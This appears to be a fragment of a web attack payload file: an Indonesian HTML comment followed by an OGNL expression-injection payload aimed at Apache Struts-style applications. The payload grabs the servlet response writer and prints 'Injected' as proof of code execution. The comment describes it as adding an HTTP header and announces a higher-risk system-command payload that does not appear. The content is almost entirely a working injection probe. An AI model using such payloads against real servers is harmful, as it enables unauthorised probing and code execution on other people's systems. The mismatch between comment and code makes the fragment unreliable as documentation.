<!--Payload ini mencoba menambahkan header HTTP sebagai bukti eksekusi EL.
Untuk payload yang menjalankan perintah sistem (berisiko tinggi dan harus dengan izin):-->

%{#runtime=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter(),#runtime.println('Injected'),#runtime.flush(),#runtime.close()}

